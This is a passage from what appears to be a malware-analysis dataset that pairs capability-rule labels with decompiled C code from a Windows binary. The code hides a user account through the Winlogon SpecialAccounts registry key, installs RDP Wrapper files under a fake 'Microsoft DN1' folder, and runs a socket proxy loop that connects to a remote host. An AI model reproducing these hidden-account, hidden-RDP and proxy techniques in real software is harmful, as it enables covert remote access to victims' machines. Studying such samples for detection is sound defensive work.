(*(param_1 + 0x4c) != 0) {\n                            uVar5 = 0;\n                            do {\n                                fcn.00405de9();\n                                fcn.0040373f(*(param_1 + 0x44) + uVar5 * 4);\n                                fcn.0040d3a8(&stack0xffffff6c);\n                                fcn.00405feb();\n                                uVar5 = uVar5 + 1;\n                                pcVar6 = _sym.imp.KERNEL32.dll_Sleep;\n                            } while (uVar5 < *(param_1 + 0x4c));\n                        }\n                        (*pcVar6)();\n                        fcn.0040373f(param_1 + 0x28);\n                        fcn.0040d3a8(&stack0xffffff68);\n                        fcn.00405feb();\n                        (*pcVar6)(500);\n                        iVar1 = fcn.0040d4db();\n                        if (iVar1 != 0) {\n                            iVar1 = fcn.00411177();\n                            if (iVar1 == 1) {\n                                fcn.00410cd8();\n                            }\n                            uVar4 = fcn.00404c5e(0, param_1 + 0x5c, param_1 + 0x60);\n                            fcn.00405044(uVar4);\n                            fcn.00404c3b();\n                            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1);\n                            uVar4 = 8;\n                            goto code_r0x0040e175;\n                        }\n                        iVar1 = param_1 + 0x60;\n                        iVar2 = param_1 + 0x5c;\n                        in_stack_ffffff58 = 7;\n                    }\n                }\n            }\n        }\n        uVar3 = fcn.00404c5e(in_stack_ffffff58, iVar2, iVar1);\n        fcn.00405044(uVar3);\n        fcn.00404c3b();\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1);\n    }\ncode_r0x0040e175:\n    fcn.00403148();\n    return uVar4;\n}\n",
        "token_count": 1770
    },
    "0040e29a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e29a(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint uVar6;\n    char16_t *pcVar7;\n    uint lpCriticalSection;\n    uint var_20h;\n    uint var_10h;\n    uint lpData;\n    uint hKey;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(&lpCriticalSection);\n    puVar4 = &lpCriticalSection;\n    puVar5 = 0x55ad18;\n    for (iVar3 = 6; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(&lpCriticalSection);\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x55ad18);\n    *0x55ad7c = arg_8h;\n    *0x55ad70 = 0x559cc0;\n    *0x55ad6c = arg_ch;\n    iVar3 = fcn.0040dcbf();\n    if (iVar3 == 0) {\n        uVar2 = fcn.00410a3c();\n        if ((uVar2 < 6) || (iVar3 = fcn.004109ed(),  iVar3 != 0)) {\n            uVar1 = fcn.00404c5e(2, 0x55ad74, 0x55ad78);\n            fcn.00405044(uVar1);\n            fcn.00404c3b();\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x55ad18);\n            return 0;\n        }\n        iVar3 = fcn.0041111b();\n        if (iVar3 == 1) {\n            uVar1 = fcn.004035b9();\n            fcn.00403549(uVar1);\n            fcn.00405feb();\n            uVar1 = fcn.004035b9();\n            fcn.00403549(uVar1);\n            fcn.00405feb();\n            uVar1 = 0;\n            (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                      (0x80000002, \n                       \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList\", 0, 0, 0, \n                       0xf013f, 0, &hKey, &var_10h);\n            lpData = 0;\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, *0x55ad74, 0, 4, &lpData, 4);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            iVar3 = fcn.0040d2b8(0x55ad74, 0x55ad78);\n            if (iVar3 != 0) {\n                uVar6 = 0x55ad74;\n                pcVar7 = L\"rudp\";\n                uVar1 = fcn.004036f7(L\"rudp\");\n                fcn.00412c34(uVar1, pcVar7);\n                fcn.00405feb(uVar1, pcVar7, uVar6);\n                uVar6 = 0x55ad78;\n                pcVar7 = L\"rpdp\";\n                uVar1 = fcn.004036f7(L\"rpdp\");\n                fcn.00412c34(uVar1, pcVar7);\n                fcn.00405feb(uVar1, pcVar7, uVar6);\n                fcn.00401f6d(fcn.0040e187, 0x55ad18);\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x55ad18);\n                return 1;\n            }\n            uVar6 = fcn.00404c5e(9, 0x55ad74, 0x55ad78);\n            fcn.00405044(uVar6);\n            fcn.00404c3b();\n        }\n        else {\n            uVar1 = fcn.00404c5e(1, 0x55ad74, 0x55ad78);\n            fcn.00405044(uVar1);\n            fcn.00404c3b();\n            uVar1 = 0;\n        }\n    }\n    else {\n        uVar1 = fcn.004036f7(L\"rudp\");\n        uVar1 = fcn.00412c67(&arg_ch, uVar1);\n        fcn.00403549(uVar1);\n        fcn.00405feb();\n        arg_ch = 0;\n        fcn.00405feb();\n        uVar1 = fcn.004036f7(L\"rpdp\");\n        uVar1 = fcn.00412c67(&arg_ch, uVar1);\n        fcn.00403549(uVar1);\n        fcn.00405feb();\n        arg_ch = 0;\n        fcn.00405feb();\n        iVar3 = fcn.00403373();\n        if ((iVar3 == 0) && (iVar3 = fcn.00403373(),  iVar3 == 0)) {\n            fcn.004036f7(0x417668);\n            uVar6 = 0x417668;\n            uVar1 = fcn.004036f7(0x417668);\n            uVar1 = fcn.00404c5e(8, uVar1, uVar6);\n            fcn.00405044(uVar1);\n            fcn.00404c3b();\n            fcn.00405feb();\n            arg_ch = 0;\n            fcn.00405feb();\n        }\n        else {\n            uVar1 = fcn.00404c5e(8, 0x55ad74, 0x55ad78);\n            fcn.00405044(uVar1);\n            fcn.00404c3b();\n        }\n        uVar1 = 1;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x55ad18);\n    return uVar1;\n}\n",
        "token_count": 1399
    },
    "0040e5a3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040e5a3(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x55ad18);\n    *0x55ad68 = 5;\n    *0x55ad60 = 5;\n    *0x55ad30 = ZEXT816(0);\n    *0x55ad40 = 0;\n    *0x55ad48 = ZEXT816(0);\n    *0x55ad58 = 0;\n    *0x55ad64 = 0;\n    puVar1 = fcn.00406099();\n    if (puVar1 == NULL) {\n        *0x55ad5c = NULL;\n    }\n    else {\n        *puVar1 = 5;\n        *0x55ad5c = puVar1 + 1;\n        **0x55ad5c = 0;\n        puVar1[2] = 0;\n        puVar1[3] = 0;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n    }\n    *0x55ad74 = 0;\n    *0x55ad78 = 0;\n    fcn.00403411(L\"TermService\");\n    fcn.00403411(L\"%ProgramFiles%\");\n    fcn.004036f7(L\"%windir%\\\\System32\");\n    uVar2 = fcn.004032e6();\n    fcn.00403549(uVar2);\n    fcn.00405feb();\n    fcn.00405feb();\n    iVar3 = fcn.00411177();\n    if (iVar3 == 1) {\n        fcn.00403411(L\"%ProgramW6432%\");\n        uVar2 = fcn.004032e6();\n        fcn.00403549(uVar2);\n        fcn.00405feb();\n        fcn.00403411(L\"%ProgramFiles%\");\n    }\n    else {\n        uVar2 = fcn.004032e6();\n        fcn.00403549(uVar2);\n        fcn.00405feb();\n    }\n    fcn.0040357c(L\"\\\\Microsoft DN1\");\n    fcn.0040357c(L\"\\\\Microsoft DN1\");\n    fcn.0040357c(L\"\\\\rfxvmt.dll\");\n    fcn.00410c3e();\n    fcn.00403549(0x55ad50);\n    fcn.0040357c(L\"\\\\rdpwrap.ini\");\n    fcn.0040357c(L\"\\\\sqlmap.dll\");\n    fcn.0040357c(L\"\\\\sqlmap.dll\");\n    return 0x55ad18;\n}\n",
        "token_count": 620
    },
    "0040e81e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040e8e1)\n\nuint __cdecl fcn.0040e81e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    uint32_t uVar3;\n    uint var_34h;\n    uint32_t var_20h;\n    uint hMem;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    iVar1 = fcn.0040e981(in_ECX);\n    if ((iVar1 != 0) && (iVar1 = fcn.0040e8f2(),  iVar1 != 0)) {\n        if ((((((var_20h & 0xf) == 0) || (uVar3 = 4,  3 < (var_20h & 0xf))) &&\n             ((iVar1 = 0,  (var_20h & 0xf0) == 0 || (uVar3 = 0x40,  0x3f < (var_20h & 0xf0))))) ||\n            (iVar2 = fcn.0040e92c(var_20h & 0xffffff00 | uVar3, &var_4h),  iVar1 = var_4h,  iVar2 != 0)) &&\n           (var_8h = fcn.0040ee24(arg_10h),  iVar1 != 0)) {\n            fcn.0040e92c(iVar1, 0);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 403
    },
    "0040f567": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.0040f567(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint var_5c8h;\n    int32_t var_5b0h;\n    int32_t var_5ach;\n    uint var_248h;\n    int32_t var_1e8h;\n    uint *var_1e4h;\n    uint var_160h;\n    int32_t var_150h;\n    uint *var_14ch;\n    int32_t var_108h;\n    uint *var_104h;\n    uint *var_d8h;\n    uint var_d4h;\n    uint var_aeh;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint *var_4h;\n    \n    if (*0x42697c != 0) {\n        iVar2 = fcn.0040f7de();\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        if ((var_1e8h != 0) || (var_1e4h != NULL)) {\n            return var_1e4h;\n        }\n        var_4h = &var_160h;\n        if ((var_5b0h != 0) || (var_5ach != 0)) {\n            return var_4h;\n        }\n        var_14h = &var_108h;\n        var_1ch = 0x10;\n        var_18h = 0;\n        var_108h = var_150h;\n        do {\n            if ((var_108h != 0) || (var_14ch != NULL)) {\n                return var_14ch;\n            }\n            var_104h = var_14ch;\n            var_4h = fcn.00401085(var_aeh);\n            if (var_4h == NULL) {\n                return NULL;\n            }\n            var_10h = &var_4h;\n            var_ch = CONCAT31(var_ch._1_3_, 1);\n            fcn.0040f8a8(var_a8h, var_a4h);\n            iVar1 = fcn.0040fa83();\n            if (iVar1 == 0) {\n                fcn.004022e8();\n                return var_d8h;\n            }\n            fcn.004022e8();\n            var_14ch = var_104h;\n        } while ((var_108h != 0x10) || (var_104h != NULL));\n    }\n    return NULL;\n}\n",
        "token_count": 610
    },
    "0040f91f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __cdecl\nfcn.0040f91f(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint arg_10h, uint arg_14h)\n\n{\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_1ch_3;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2ch_2;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_20h;\n    uint var_1ch_2;\n    uint var_18h;\n    uint var_14h_2;\n    uint var_10h;\n    \n    if (*0x42697c != 0) {\n        if (0 < var_44h) {\n            var_44h = var_44h + -1;\n        }\n        if (0 < var_44h) {\n            var_44h = var_44h + -1;\n        }\n        if (0 < var_44h) {\n            var_44h = var_44h + -1;\n        }\n        if (0 < var_44h) {\n            var_44h = var_44h + -1;\n        }\n        return CONCAT44(var_44h >> 0x1f, 0x2b);\n    }\n    return 0;\n}\n",
        "token_count": 470
    },
    "0040fe49": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040fe49(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack16 = *(arg_8h + 4);\n    uStack12 = *(arg_8h + 0x10);\n    do {\n        iVar1 = fcn.0040feb5();\n        if (iVar1 < 1) goto code_r0x0040fea4;\n        iVar1 = (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack16, 0, *(arg_8h + 0x1c));\n        if (iVar1 == 0) {\n            iVar1 = fcn.0040feb5();\n            if (0 < iVar1) {\n                iVar1 = 0;\n            }\n            goto code_r0x0040fea4;\n        }\n    } while (iVar1 != 1);\n    iVar1 = 1;\ncode_r0x0040fea4:\n    fcn.0040ffa8();\n    return iVar1;\n}\n",
        "token_count": 240
    },
    "0040ffa8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040ffa8(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = param_1 + 0x14;\n    if (*piVar1 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar2 != *(param_1 + 0x18)) {\n            if (*(param_1 + 0x10) == 0) {\n                return;\n            }\n            (*_sym.imp.KERNEL32.dll_SetEvent)(*(param_1 + 0x10));\n            iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*piVar1, 5000);\n            if (iVar2 == 0x102) {\n                (*_sym.imp.KERNEL32.dll_TerminateThread)(*piVar1, 0xfffffffe);\n            }\n        }\n        fcn.004101ab();\n    }\n    fcn.004101ab();\n    fcn.004101ab();\n    fcn.004101ab();\n    fcn.004101ab();\n    *(param_1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 264
    },
    "004101ab": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004101ab(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 61
    },
    "004101ef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004101ef(uint arg_8h)\n\n{\n    uint in_ECX;\n    uint uVar1;\n    uint var_4h;\n    \n    if (*0x426614 == 0) {\n        uVar1 = 0;\n        var_4h = in_ECX;\n    }\n    else {\n        fcn.00403271();\n        var_4h = 0;\n        uVar1 = fcn.0040319e(&var_4h, 0);\n        uVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(*0x426614, arg_8h, uVar1);\n    }\n    fcn.00405feb();\n    return uVar1;\n}\n",
        "token_count": 157
    },
    "004103b9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004103b9(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_818h;\n    uint name;\n    uint var_ch;\n    \n    uVar1 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 6);\n    iVar2 = (*_sym.imp.WS2_32.dll_gethostbyname)(param_1);\n    fcn.0040102c(&var_ch, **(iVar2 + 0xc), *(iVar2 + 10));\n    name._0_2_ = 2;\n    name._2_2_ = (*_sym.imp.WS2_32.dll_htons)(param_2);\n    fcn.00401052(&var_818h, 0, 0x802);\n    (*_sym.imp.WS2_32.dll_InetNtopW)(2, &var_ch, &var_818h, 0x802);\n    while (*0x426755 == '\\0') {\n        iVar2 = (*_sym.imp.WS2_32.dll_connect)(uVar1, &name, 0x10);\n        if (iVar2 != -1) {\n            *0x426755 = '\\x01';\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 300
    },
    "0041046e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041046e(uint param_1)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_868h;\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_30h;\n    uint uStack48;\n    ushort uStack44;\n    uint lpThreadId;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t len;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    *0x559cac = param_1;\n    do {\n        while( true ) {\n            piVar4 = fcn.0041075c(&var_60h);\n            var_1ch = *piVar4;\n            len = piVar4[1];\n            var_14h = piVar4[2];\n            if (*0x426755 == '\\0') {\n                return;\n            }\n            var_1h._0_1_ = '\\0';\n            piVar4 = fcn.00406099();\n            iVar5 = var_14h;\n            if (piVar4 == NULL) {\n                piVar4 = NULL;\n            }\n            else {\n                *piVar4 = 0;\n                piVar4[1] = 0;\n                piVar4[2] = 0;\n            }\n            iVar3 = var_1ch * 0xc;\n            piVar1 = iVar3 + 0x426980;\n            cVar2 = var_1h;\n            if (*piVar1 == var_1ch) {\n                piVar4 = piVar1;\n                cVar2 = '\\x01';\n            }\n            if (cVar2 != '\\0') break;\n            var_8h._0_2_ = 5;\n            fcn.004106f9(2, var_1ch);\n            *(piVar4 + 1) = 1;\n            *piVar4 = var_1ch;\n            *piVar1 = *piVar4;\n            *(iVar3 + 0x426984) = piVar4[1];\n            *(iVar3 + 0x426988) = piVar4[2];\n        }\n        if (*(piVar4 + 1) == '\\x01') {\n            fcn.00401052(&var_868h, 0, 0x802);\n            var_10h = 0;\n            var_ch = 0;\n            puVar6 = &var_50h;\n            for (iVar5 = 8; iVar3 = var_14h,  iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            var_30h = 0;\n            uStack48 = 0;\n            uStack44 = 0;\n            cVar2 = *(var_14h + 3);\n            if (cVar2 == '\\x01') {\n                (*_sym.imp.WS2_32.dll_InetNtopW)(2, var_14h + 4, &var_868h, 0x802);\ncode_r0x00410543:\n                var_ch = fcn.004108dc();\n            }\n            else if (cVar2 == '\\x03') {\n                fcn.00401052(&var_50h, 0, 0x20);\n                var_4ch = 2;\n                var_48h = 1;\n                var_44h = 6;\n                iVar5 = fcn.00401085(0x200);\n                fcn.0040102c(iVar5, iVar3 + 5, *(iVar3 + 4));\n                var_20h = 0;\n                fcn.0040102c(*(iVar3 + 4) + iVar5, &var_20h, 1);\n                iVar5 = (*_sym.imp.WS2_32.dll_getaddrinfo)(iVar5, 0, &var_50h, &var_10h);\n                if (iVar5 == 0) goto code_r0x00410543;\n            }\n            else if (cVar2 == '\\x04') {\n                (*_sym.imp.WS2_32.dll_InetNtopW)(0x17, var_14h + 4, &var_868h, 0x802);\n                var_ch = fcn.0041085b();\n            }\n            var_30h = CONCAT22(var_30h._2_2_, 5);\n            var_30h = CONCAT13(1, var_30h);\n            fcn.004106f9(10, var_1ch);\n            iVar5 = *piVar4 * 0xc;\n            piVar4[2] = var_ch;\n            *(piVar4 + 1) = 2;\n            lpThreadId = 0;\n            *(iVar5 + 0x426980) = *piVar4;\n            *(iVar5 + 0x426984) = piVar4[1];\n            *(iVar5 + 0x426988) = piVar4[2];\n            (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0041068d, piVar4, 0, &lpThreadId);\n            iVar5 = var_14h;\n        }\n        else {\n            (*_sym.imp.WS2_32.dll_send)(piVar4[2], var_14h, len, 0);\n        }\n        fcn.00401099(iVar5);\n    } while( true );\n}\n",
        "token_count": 1316
    },
    "0041068d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041068d(uint *arg_8h)\n\n{\n    uint arg_ch;\n    uint uVar1;\n    uint uVar2;\n    int32_t arg_8h_00;\n    \n    arg_ch = *arg_8h;\n    uVar1 = arg_8h[2];\n    if (*0x426755 != '\\0') {\n        do {\n            uVar2 = fcn.00401085(0x2000);\n            arg_8h_00 = (*_sym.imp.WS2_32.dll_recv)(uVar1, uVar2, 8000, 0);\n            if ((arg_8h_00 == -1) || (arg_8h_00 == 0)) {\n                (*_sym.imp.WS2_32.dll_closesocket)(uVar1);\n                fcn.00401099(uVar2);\n                return;\n            }\n            fcn.004106f9(arg_8h_00, arg_ch);\n            fcn.00401099(uVar2);\n        } while (*0x426755 != '\\0');\n    }\n    return;\n}\n",
        "token_count": 245
    },
    "004109ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004109ed(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_11ch;\n    uint var_2h;\n    \n    var_11ch = 0x11c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x419c38);\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"RtlGetVersion\");\n        if (pcVar2 == NULL) {\n            return 0;\n        }\n        (*pcVar2)(&var_11ch);\n    }\n    if ((var_2h != '\\x02') && (var_2h != '\\x03')) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 203
    },
    "00410a3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00410a3c(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_11ch;\n    uint var_118h;\n    int32_t var_10ch;\n    \n    var_11ch = 0x11c;\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x419c38);\n    if (iVar1 != 0) {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"RtlGetVersion\");\n        if (pcVar2 == NULL) {\n            return 0;\n        }\n        (*pcVar2)(&var_11ch);\n    }\n    if (var_10ch != 2) {\n        return 0;\n    }\n    return var_118h;\n}\n",
        "token_count": 178
    },
    "00410c50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00410c50(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    int32_t hKey;\n    \n    hKey = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(param_1, *param_2, 0, 0x20019, &hKey);\n    if (iVar1 == 2) {\n        return 0;\n    }\n    if (hKey != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    return 1;\n}\n",
        "token_count": 138
    },
    "00410d2d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00410d2d(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint pvarg;\n    uint var_20h;\n    uint var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *ppv;\n    \n    (*_sym.imp.ole32.dll_CoInitializeSecurity)(0, 0xffffffff, 0, 0, 0, 3, 0, 0, 0);\n    iVar1 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar1) {\n        ppv = NULL;\n        iVar1 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x4174b0, 0, 0x17, 0x419cc8, &ppv);\n        if (-1 < iVar1) {\n            var_10h = NULL;\n            iVar1 = (**(*ppv + 0xc))(ppv, L\"root\\\\CIMV2\", 0, 0, 0, 0x80, 0, 0, &var_10h);\n            piVar2 = ppv;\n            if (-1 < iVar1) {\n                var_ch = NULL;\n                iVar1 = (**(*var_10h + 0x50))\n                                  (var_10h, 0x419cc0, L\"SELECT Name FROM Win32_VideoController\", 0x20, 0, &var_ch);\n                if (-1 < iVar1) {\n                    var_8h = NULL;\n                    while( true ) {\n                        iVar1 = (**(*var_ch + 0x10))(var_ch, 0xffffffff, 1, &var_8h, &var_14h);\n                        if ((iVar1 == 1) || (iVar1 < 0)) {\n                            (**(*var_ch + 8))(var_ch);\n                            (**(*var_10h + 8))(var_10h);\n                            uVar3 = (**(*ppv + 8))(ppv);\n                            return uVar3;\n                        }\n                        (*_sym.imp.OLEAUT32.dll_VariantClear)(&pvarg);\n                        iVar1 = (**(*var_8h + 0x10))(var_8h, L\"Name\", 0, &pvarg, 0, 0);\n                        if ((-1 < iVar1) && (pvarg == 8)) break;\n                        (**(*var_8h + 8))(var_8h);\n                    }\n                    goto code_r0x00410da4;\n                }\n                (**(*ppv + 8))(ppv);\n                piVar2 = var_10h;\n            }\n            (**(*piVar2 + 8))(piVar2);\n        }\n    }\n    var_20h = 0x417668;\ncode_r0x00410da4:\n    fcn.004036f7(var_20h);\n    return param_1;\n}\n",
        "token_count": 677
    },
    "00410f61": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
